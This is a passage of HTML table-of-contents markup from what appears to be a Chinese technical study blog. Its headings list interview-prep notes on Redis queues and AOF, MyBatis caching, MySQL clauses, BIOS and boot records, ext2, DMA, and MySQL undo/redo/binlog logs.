href="#%F0%9F%94%B9%E4%B8%89%E3%80%81%E7%B1%BB%E6%AF%94%E5%9C%BA%E6%99%AF%E5%8A%A9%E7%90%86%E8%A7%A3"><span class="toc-text">🔹三、类比场景助理解</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-text">Redis（小林）</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#List%E7%B1%BB%E5%9E%8B%E5%92%8CRedis-Stream%E7%B1%BB%E5%9E%8B"><span class="toc-text">List类型和Redis Stream类型</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E2%9C%85-Redis-%E7%9A%84-List-%E7%94%A8%E4%BD%9C%E6%B6%88%E6%81%AF%E9%98%9F%E5%88%97-%E2%80%94%E2%80%94-%E6%98%AF%E6%80%8E%E4%B9%88%E5%81%9A%E7%9A%84%EF%BC%9F"><span class="toc-text">✅ Redis 的 List 用作消息队列 —— 是怎么做的？</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E2%9D%97%E4%BD%86%E4%B8%BA%E4%BB%80%E4%B9%88%E8%AF%B4%E5%AE%83%E2%80%9C%E6%9C%89%E4%B8%A4%E4%B8%AA%E9%97%AE%E9%A2%98%E2%80%9D%EF%BC%9F"><span class="toc-text">❗但为什么说它“有两个问题”？</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%F0%9F%94%B8%E9%97%AE%E9%A2%98-1%EF%BC%9A%E7%94%9F%E4%BA%A7%E8%80%85%E9%9C%80%E8%A6%81%E8%87%AA%E5%B7%B1%E7%94%9F%E6%88%90%E5%85%A8%E5%B1%80%E5%94%AF%E4%B8%80-ID"><span class="toc-text">🔸问题 1：生产者需要自己生成全局唯一 ID</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%F0%9F%92%AC-%E4%BB%80%E4%B9%88%E6%84%8F%E6%80%9D%EF%BC%9F"><span class="toc-text">💬 什么意思？</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E2%9C%85-%E4%B8%BE%E4%BE%8B%EF%BC%9A"><span class="toc-text">✅ 举例：</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%F0%9F%94%B8%E9%97%AE%E9%A2%98-2%EF%BC%9A%E4%B8%8D%E6%94%AF%E6%8C%81%E6%B6%88%E8%B4%B9%E7%BB%84%EF%BC%88%E5%8D%B3%E5%A4%9A%E4%B8%AA%E6%B6%88%E8%B4%B9%E8%80%85%E7%8B%AC%E7%AB%8B%E6%B6%88%E8%B4%B9%EF%BC%89"><span class="toc-text">🔸问题 2：不支持消费组（即多个消费者独立消费）</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%F0%9F%92%AC-%E4%BB%80%E4%B9%88%E6%84%8F%E6%80%9D%EF%BC%9F-2"><span class="toc-text">💬 什么意思？</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%F0%9F%9A%AB-%E7%BB%93%E6%9E%9C%E5%B0%B1%E6%98%AF%EF%BC%9A"><span class="toc-text">🚫 结果就是：</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E2%9C%85-%E6%80%8E%E4%B9%88%E5%8A%9E%EF%BC%9F%E6%9C%89%E6%9B%B4%E5%A5%BD%E7%9A%84%E6%96%B9%E6%A1%88%E5%90%97%EF%BC%9F"><span class="toc-text">✅ 怎么办？有更好的方案吗？</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%F0%9F%94%B9Redis-Stream%EF%BC%88%E6%8E%A8%E8%8D%90%E6%9B%BF%E4%BB%A3%EF%BC%89"><span class="toc-text">🔹Redis Stream（推荐替代）</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%F0%9F%8E%AF%E9%9D%A2%E8%AF%95%E5%9B%9E%E7%AD%94%E5%BB%BA%E8%AE%AE%EF%BC%9A"><span class="toc-text">🎯面试回答建议：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#AOF%E5%88%B7%E7%9B%98"><span class="toc-text">AOF刷盘</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%F0%9F%A7%A9-%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%A6%82%E6%8B%AC"><span class="toc-text">🧩 一句话概括</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%F0%9F%94%A7-%E8%83%8C%E6%99%AF%EF%BC%9ARedis-%E6%98%AF%E5%86%85%E5%AD%98%E6%95%B0%E6%8D%AE%E5%BA%93%EF%BC%8C%E4%B8%BA%E4%BB%80%E4%B9%88%E9%9C%80%E8%A6%81-AOF%EF%BC%9F"><span class="toc-text">🔧 背景：Redis 是内存数据库，为什么需要 AOF？</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%F0%9F%97%82-AOF-%E5%B7%A5%E4%BD%9C%E6%B5%81%E7%A8%8B"><span class="toc-text">🗂 AOF 工作流程</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%F0%9F%92%A1%E4%BB%80%E4%B9%88%E5%8F%AB%E2%80%9C%E5%88%B7%E7%9B%98%E2%80%9D%EF%BC%9F"><span class="toc-text">💡什么叫“刷盘”？</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%F0%9F%A7%B0-AOF-%E7%9A%84%E5%88%B7%E7%9B%98%E7%AD%96%E7%95%A5%EF%BC%883-%E7%A7%8D%EF%BC%89"><span class="toc-text">🧰 AOF 的刷盘策略（3 种）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%F0%9F%94%81-AOF-%E6%81%A2%E5%A4%8D%E6%9C%BA%E5%88%B6%EF%BC%88%E5%AE%95%E6%9C%BA%E9%87%8D%E5%90%AF%EF%BC%89"><span class="toc-text">🔁 AOF 恢复机制（宕机重启）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%F0%9F%A7%A0-%E9%9D%A2%E8%AF%95%E5%9B%9E%E7%AD%94%E6%A8%A1%E6%9D%BF"><span class="toc-text">🧠 面试回答模板</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-text">mybatis一级缓存和二级缓存</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%A4%E8%80%85%E7%9A%84%E5%AE%9A%E4%B9%89"><span class="toc-text">两者的定义</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-text">✅ 一、MyBatis 一级缓存</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%F0%9F%93%96-%E5%AE%9A%E4%B9%89%EF%BC%9A"><span class="toc-text">📖 定义：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%9A%99%EF%B8%8F-%E7%89%B9%E7%82%B9%EF%BC%9A"><span class="toc-text">⚙️ 特点：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%F0%9F%93%A6-%E7%A4%BA%E4%BE%8B%EF%BC%9A"><span class="toc-text">📦 示例：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%F0%9F%9A%A8-%E4%B8%80%E7%BA%A7%E7%BC%93%E5%AD%98%E5%A4%B1%E6%95%88%E7%9A%84%E6%83%85%E5%86%B5%EF%BC%88%E5%B8%B8%E8%80%83%EF%BC%89%EF%BC%9A"><span class="toc-text">🚨 一级缓存失效的情况（常考）：</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-text">✅ 二、MyBatis 二级缓存</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%F0%9F%93%96-%E5%AE%9A%E4%B9%89%EF%BC%9A-2"><span class="toc-text">📖 定义：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%9A%99%EF%B8%8F-%E7%89%B9%E7%82%B9%EF%BC%9A-2"><span class="toc-text">⚙️ 特点：</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%A6%82%E4%BD%95%E5%BC%80%E5%90%AF%E4%BA%8C%E7%BA%A7%E7%BC%93%E5%AD%98"><span class="toc-text">如何开启二级缓存</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E2%9C%85-%E4%BA%8C%E3%80%81%E5%85%B3%E9%94%AE%E6%96%87%E4%BB%B6%E9%85%8D%E7%BD%AE"><span class="toc-text">✅ 二、关键文件配置</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-mybatis-config-xml%EF%BC%88%E5%85%A8%E5%B1%80%E9%85%8D%E7%BD%AE%EF%BC%8C%E5%BC%80%E5%90%AF%E4%BA%8C%E7%BA%A7%E7%BC%93%E5%AD%98%EF%BC%89"><span class="toc-text">1. mybatis-config.xml（全局配置，开启二级缓存）</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#MyBatis-%E6%B3%A8%E8%A7%A3%E6%96%B9%E5%BC%8F%E4%B8%8B%E5%A6%82%E4%BD%95%E5%90%AF%E7%94%A8%E5%92%8C%E4%BD%BF%E7%94%A8%E4%BA%8C%E7%BA%A7%E7%BC%93%E5%AD%98"><span class="toc-text">MyBatis 注解方式下如何启用和使用二级缓存</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%F0%9F%94%A7-%E8%83%8C%E6%99%AF%E7%9F%A5%E8%AF%86"><span class="toc-text">🔧 背景知识</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E2%9C%85-%E5%BC%80%E5%90%AF%E6%96%B9%E5%BC%8F%E8%AF%A6%E8%A7%A3"><span class="toc-text">✅ 开启方式详解</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BC%80%E5%90%AF%E4%BA%8C%E7%BA%A7%E7%BC%93%E5%AD%98%EF%BC%9A-CacheNamespace"><span class="toc-text">开启二级缓存：@CacheNamespace</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%9C%85-%E6%8E%A8%E8%8D%90%E6%96%B9%E5%BC%8F%EF%BC%9A-CacheNamespaceRef"><span class="toc-text">✅ 推荐方式：@CacheNamespaceRef</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%F0%9F%94%81-%E6%96%B9%E6%B3%95%E7%BA%A7%E5%88%AB%E7%9A%84%E9%85%8D%E7%BD%AE%EF%BC%9A-Options"><span class="toc-text">🔁 方法级别的配置：@Options</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%F0%9F%93%8C-%E7%A4%BA%E4%BE%8B%E6%B1%87%E6%80%BB"><span class="toc-text">📌 示例汇总</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%9C%85-UserMapper-java"><span class="toc-text">✅ UserMapper.java</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%9C%85-OrderMapper-java"><span class="toc-text">✅ OrderMapper.java</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-text">mysql的on、where、having的区别</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%9C%85-1-WHERE-%E2%80%94%E2%80%94-%E4%BD%9C%E7%94%A8%E4%BA%8E-%E5%8E%9F%E5%A7%8B%E6%95%B0%E6%8D%AE%EF%BC%88%E5%88%86%E7%BB%84%E5%89%8D%EF%BC%89"><span class="toc-text">✅ 1. WHERE —— 作用于 原始数据（分组前）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%9C%85-2-HAVING-%E2%80%94%E2%80%94-%E4%BD%9C%E7%94%A8%E4%BA%8E-%E5%88%86%E7%BB%84%E5%90%8E%E7%9A%84%E8%81%9A%E5%90%88%E6%95%B0%E6%8D%AE"><span class="toc-text">✅ 2. HAVING —— 作用于 分组后的聚合数据</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%9C%85-3-ON-%E2%80%94%E2%80%94-%E4%BD%9C%E7%94%A8%E4%BA%8E-%E8%A1%A8%E8%BF%9E%E6%8E%A5%E6%97%B6%E7%9A%84%E8%A1%8C%E5%8C%B9%E9%85%8D%E6%9D%A1%E4%BB%B6"><span class="toc-text">✅ 3. ON —— 作用于 表连接时的行匹配条件</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E2%9C%85-%E6%AD%A3%E7%A1%AE%E7%90%86%E8%A7%A3%EF%BC%9A"><span class="toc-text">✅ 正确理解：</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%F0%9F%94%84-SQL-%E6%89%A7%E8%A1%8C%E9%A1%BA%E5%BA%8F%EF%BC%88%E7%AE%80%E5%8C%96%E7%89%88%EF%BC%89%EF%BC%9A"><span class="toc-text">🔄 SQL 执行顺序（简化版）：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%F0%9F%94%8D-%E4%B8%BE%E4%B8%AA%E4%BE%8B%E5%AD%90%E8%AF%B4%E6%98%8E%EF%BC%9A"><span class="toc-text">🔍 举个例子说明：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%F0%9F%A7%A0-%E4%B8%BA%E4%BB%80%E4%B9%88%E6%9C%89%E4%BA%BA%E8%AF%B4-WHERE-%E6%98%AF%E2%80%9C%E5%AF%B9%E5%8E%9F%E5%A7%8B%E6%95%B0%E6%8D%AE%E2%80%9D%E7%AD%9B%E9%80%89%EF%BC%9F"><span class="toc-text">🧠 为什么有人说 WHERE 是“对原始数据”筛选？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%9C%85-%E6%80%BB%E7%BB%93%E9%87%91%E5%8F%A5%EF%BC%9A"><span class="toc-text">✅ 总结金句：</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-text">BIOS</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%9C%85-%E4%B8%80%E5%8F%A5%E8%AF%9D%E8%A7%A3%E9%87%8A%EF%BC%9A"><span class="toc-text">✅ 一句话解释：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%F0%9F%A7%A0-BIOS-%E7%9A%84%E4%B8%BB%E8%A6%81%E4%BD%9C%E7%94%A8%EF%BC%9A"><span class="toc-text">🧠 BIOS 的主要作用：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%F0%9F%96%BC%EF%B8%8F-%E7%AE%80%E5%8D%95%E6%B5%81%E7%A8%8B%E5%9B%BE%EF%BC%88%E4%BD%A0%E5%8F%AF%E4%BB%A5%E5%9C%A8%E9%9D%A2%E8%AF%95%E4%B8%AD%E5%8F%A3%E8%BF%B0%EF%BC%89%EF%BC%9A"><span class="toc-text">🖼️ 简单流程图（你可以在面试中口述）：</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-text">文件系统</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%F0%9F%A7%AD-%E4%B8%80%E3%80%81MBR-%E4%B8%8E%E5%BC%95%E5%AF%BC%E5%9D%97%E7%9A%84%E4%BD%8D%E7%BD%AE%E5%92%8C%E4%BD%9C%E7%94%A8"><span class="toc-text">🧭 一、MBR 与引导块的位置和作用</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%9C%85-1-MBR%EF%BC%88%E4%B8%BB%E5%BC%95%E5%AF%BC%E8%AE%B0%E5%BD%95%EF%BC%8CMaster-Boot-Record%EF%BC%89"><span class="toc-text">✅ 1. MBR（主引导记录，Master Boot Record）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%9C%85-2-%E5%BC%95%E5%AF%BC%E5%9D%97%EF%BC%88Boot-Block-Volume-Boot-Record%EF%BC%89"><span class="toc-text">✅ 2. 引导块（Boot Block &#x2F; Volume Boot Record）</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%F0%9F%A7%A9-%E4%B8%89%E3%80%81%E7%B3%BB%E7%BB%9F%E5%90%AF%E5%8A%A8%E6%B5%81%E7%A8%8B%EF%BC%88%E7%BB%93%E5%90%88%E7%A1%AC%E7%9B%98%E5%92%8C%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F%EF%BC%89"><span class="toc-text">🧩 三、系统启动流程（结合硬盘和文件系统）</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8F%AF%E4%BB%A5%E6%8A%8A%E6%95%B4%E4%B8%AA%E5%BC%95%E5%AF%BC%E8%BF%87%E7%A8%8B%E7%90%86%E8%A7%A3%E4%B8%BA%E6%8E%A5%E5%8A%9B%E8%B5%9B%E8%B7%91%EF%BC%9A"><span class="toc-text">可以把整个引导过程理解为接力赛跑：</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E2%9C%85-%E5%93%AA%E4%BA%9B%E5%8C%BA%E5%9F%9F%E6%9C%89%E5%A4%87%E4%BB%BD%EF%BC%9F%EF%BC%88ext2-%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F%EF%BC%89"><span class="toc-text">✅ 哪些区域有备份？（ext2 文件系统）</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-Super-Block%EF%BC%88%E8%B6%85%E7%BA%A7%E5%9D%97%EF%BC%89%E5%A4%87%E4%BB%BD"><span class="toc-text">1.Super Block（超级块）备份</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-Group-Descriptor-Table%EF%BC%88%E7%BB%84%E6%8F%8F%E8%BF%B0%E7%AC%A6%E8%A1%A8%EF%BC%89%E5%A4%87%E4%BB%BD"><span class="toc-text">2.Group Descriptor Table（组描述符表）备份</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%F0%9F%93%A6-ext2-%E7%9A%84%E5%A4%87%E4%BB%BD%E5%9D%97%E7%BB%84%E7%A4%BA%E6%84%8F%E5%9B%BE"><span class="toc-text">📦 ext2 的备份块组示意图</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-text">总线和端口</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E2%9C%85-%E4%BB%80%E4%B9%88%E6%98%AF%E5%86%85%E5%AD%98%E6%98%A0%E5%B0%84-I-O%EF%BC%88Memory-Mapped-I-O%EF%BC%89%EF%BC%9F"><span class="toc-text">✅ 什么是内存映射 I&#x2F;O（Memory-Mapped I&#x2F;O）？</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%F0%9F%A7%A0-%E4%B8%BA%E4%BB%80%E4%B9%88%E8%A6%81%E8%BF%99%E4%B9%88%E5%81%9A%EF%BC%9F"><span class="toc-text">🧠 为什么要这么做？</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%F0%9F%A7%A9-%E4%B8%BE%E4%B8%AA%E4%BE%8B%E5%AD%90%EF%BC%88%E5%81%87%E8%AE%BE%E5%9C%A8%E6%9F%90%E4%B8%AA%E5%B5%8C%E5%85%A5%E5%BC%8F%E7%B3%BB%E7%BB%9F%E4%B8%AD%EF%BC%89%EF%BC%9A"><span class="toc-text">🧩 举个例子（假设在某个嵌入式系统中）：</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-text">DMA</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%9D%8C-%E6%B2%A1%E6%9C%89-DMA-%E6%97%B6%E7%9A%84%E6%95%B0%E6%8D%AE%E6%90%AC%E8%BF%90%E6%B5%81%E7%A8%8B%EF%BC%88%E7%A8%8B%E5%BA%8F%E5%BC%8F-I-O%EF%BC%89%EF%BC%9A"><span class="toc-text">❌ 没有 DMA 时的数据搬运流程（程序式 I&#x2F;O）：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%9D%97-%E4%BC%9A%E5%8F%91%E7%94%9F%E4%BB%80%E4%B9%88%EF%BC%9F"><span class="toc-text">❗ 会发生什么？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%F0%9F%9A%A7-2-%E4%BC%A0%E7%BB%9F%E6%95%B0%E6%8D%AE%E4%BC%A0%E8%BE%93%E6%96%B9%E5%BC%8F%E7%9A%84%E5%B1%80%E9%99%90"><span class="toc-text">🚧 2. 传统数据传输方式的局限</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E2%9C%85-%E4%B8%AD%E6%96%AD%E6%96%B9%E5%BC%8F%EF%BC%9A"><span class="toc-text">✅ 中断方式：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E2%9A%A0%EF%B8%8F-%E7%A8%8B%E5%BA%8F%E5%BC%8F-I-O%EF%BC%88Programmed-I-O%EF%BC%89%EF%BC%9A"><span class="toc-text">⚠️ 程序式 I&#x2F;O（Programmed I&#x2F;O）：</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%F0%9F%94%84-3-DMA-%E7%9A%84%E5%B7%A5%E4%BD%9C%E5%8E%9F%E7%90%86"><span class="toc-text">🔄 3. DMA 的工作原理</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%F0%9F%A7%BE-DMA-%E7%9A%84%E5%AE%9A%E4%B9%89%EF%BC%9A"><span class="toc-text">🧾 DMA 的定义：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%F0%9F%93%A6-%E6%95%B0%E6%8D%AE%E4%BC%A0%E8%BE%93%E6%B5%81%E7%A8%8B%EF%BC%9A"><span class="toc-text">📦 数据传输流程：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%F0%9F%92%AC-%E5%AF%B9%E6%AF%94%E4%B8%AD%E6%96%AD%E6%96%B9%E5%BC%8F%EF%BC%9A"><span class="toc-text">💬 对比中断方式：</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%F0%9F%94%8C-4-%E6%80%BB%E7%BA%BF%E5%8D%A0%E7%94%A8%E9%97%AE%E9%A2%98"><span class="toc-text">🔌 4. 总线占用问题</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-text">Undo日志和Redo日志</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Undo%E6%97%A5%E5%BF%97%E5%BA%94%E7%94%A8%E5%9C%BA%E6%99%AF"><span class="toc-text">Undo日志应用场景</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%F0%9F%A7%A0-%E6%AF%8F%E6%AD%A5%E8%A7%A3%E6%9E%90%EF%BC%9A"><span class="toc-text">🧠 每步解析：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%F0%9F%A7%A0-%E6%AF%8F%E6%AD%A5%E8%A7%A3%E6%9E%90%EF%BC%9A-2"><span class="toc-text">🧠 每步解析：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%9C%85-%E6%9C%80%E7%BB%88-T2-%E6%9F%A5%E8%AF%A2%E7%BB%93%E6%9E%9C%EF%BC%9A"><span class="toc-text">✅ 最终 T2 查询结果：</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Redo%E6%97%A5%E5%BF%97%E5%BA%94%E7%94%A8%E5%9C%BA%E6%99%AF"><span class="toc-text">Redo日志应用场景</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Undo-log%E3%80%81Redo-log%E3%80%81Binlog"><span class="toc-text">Undo log、Redo log、Binlog</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E2%9C%85-%E5%9C%BA%E6%99%AF%E7%A4%BA%E4%BE%8B%EF%BC%9AA-%E5%90%91-B-%E8%BD%AC%E8%B4%A6-100-%E5%85%83"><span class="toc-text">✅ 场景示例：A 向 B 转账 100 元</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%F0%9F%A7%A9-%E4%B8%80%E3%80%81Redo-Log%EF%BC%88%E9%87%8D%E5%81%9A%E6%97%A5%E5%BF%97%EF%BC%89"><span class="toc-text">🧩 一、Redo Log（重做日志）</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%F0%9F%92%A1-%E4%BD%9C%E7%94%A8"><span class="toc-text">💡 作用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%F0%9F%95%B0%EF%B8%8F-%E5%86%99%E5%85%A5%E6%97%B6%E6%9C%BA"><span class="toc-text">🕰️ 写入时机</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%F0%9F%93%A6-%E5%86%85%E5%AE%B9%E5%BD%A2%E5%BC%8F"><span class="toc-text">📦 内容形式</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%F0%9F%A7%A0-%E7%A4%BA%E4%BE%8B"><span class="toc-text">🧠 示例</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%F0%9F%97%82%EF%B8%8F-%E5%82%A8%E5%AD%98%E4%BD%8D%E7%BD%AE"><span class="toc-text">🗂️ 储存位置</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%F0%9F%A7%A9-%E4%BA%8C%E3%80%81Undo-Log%EF%BC%88%E5%9B%9E%E6%BB%9A%E6%97%A5%E5%BF%97%EF%BC%89"><span class="toc-text">🧩 二、Undo Log（回滚日志）</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%F0%9F%92%A1-%E4%BD%9C%E7%94%A8-2"><span class="toc-text">💡 作用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%F0%9F%95%B0%EF%B8%8F-%E5%86%99%E5%85%A5%E6%97%B6%E6%9C%BA-2"><span class="toc-text">🕰️ 写入时机</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%F0%9F%93%A6-%E5%86%85%E5%AE%B9%E5%BD%A2%E5%BC%8F-2"><span class="toc-text">📦 内容形式</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%F0%9F%A7%A0-%E7%A4%BA%E4%BE%8B-2"><span class="toc-text">🧠 示例</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%F0%9F%97%82%EF%B8%8F-%E5%82%A8%E5%AD%98%E4%BD%8D%E7%BD%AE-2"><span class="toc-text">🗂️ 储存位置</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%F0%9F%A7%A9-%E4%B8%89%E3%80%81Binlog%EF%BC%88%E4%BA%8C%E8%BF%9B%E5%88%B6%E6%97%A5%E5%BF%97%EF%BC%89"><span class="toc-text">🧩 三、Binlog（二进制日志）</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%F0%9F%92%A1-%E4%BD%9C%E7%94%A8-3"><span class="toc-text">💡 作用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%F0%9F%95%B0%EF%B8%8F-%E5%86%99%E5%85%A5%E6%97%B6%E6%9C%BA-3"><span class="toc-text">🕰️ 写入时机</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%F0%9F%93%A6-%E5%86%85%E5%AE%B9%E5%BD%A2%E5%BC%8F%EF%BC%88%E5%8F%96%E5%86%B3%E4%BA%8E-binlog-format%EF%BC%89%EF%BC%9A"><span class="toc-text">📦 内容形式（取决于 binlog_format）：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%F0%9F%A7%A0-%E7%A4%BA%E4%BE%8B%EF%BC%88ROW-%E6%A0%BC%E5%BC%8F%EF%BC%89%EF%BC%9A"><span class="toc-text">🧠 示例（ROW 格式）：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%F0%9F%97%82%EF%B8%8F-%E5%82%A8%E5%AD%98%E4%BD%8D%E7%BD%AE-3"><span class="toc-text">🗂️ 储存位置</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E2%9C%85-%E4%BE%8B%E5%AD%90%EF%BC%9AA-%E8%BD%AC%E8%B4%A6-100-%E5%85%83%E7%BB%99-B"><span class="toc-text">✅ 例子：A 转账 100 元给 B</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%F0%9F%A7%A0-%E8%83%8C%E5%90%8E%E5%88%B0%E5%BA%95%E5%8F%91%E7%94%9F%E4%BA%86%E4%BB%80%E4%B9%88%EF%BC%9F"><span class="toc-text">🧠 背后到底发生了什么？</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%8F%B1%EF%B8%8F-1-%E4%BA%8B%E5%8A%A1%E5%BC%80%E5%A7%8B%EF%BC%88BEGIN%EF%BC%89"><span class="toc-text">⏱️ 1. 事务开始（BEGIN）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%8F%B1%EF%B8%8F-2-%E6%9B%B4%E6%96%B0%E6%95%B0%E6%8D%AE%E6%97%B6%EF%BC%88%E6%89%A7%E8%A1%8C-UPDATE%EF%BC%89"><span class="toc-text">⏱️ 2. 更新数据时（执行 UPDATE）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%8F%B1%EF%B8%8F-3-%E6%8F%90%E4%BA%A4%E4%BA%8B%E5%8A%A1%E6%97%B6%EF%BC%88COMMIT%EF%BC%89"><span class="toc-text">⏱️ 3. 提交事务时（COMMIT）</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" 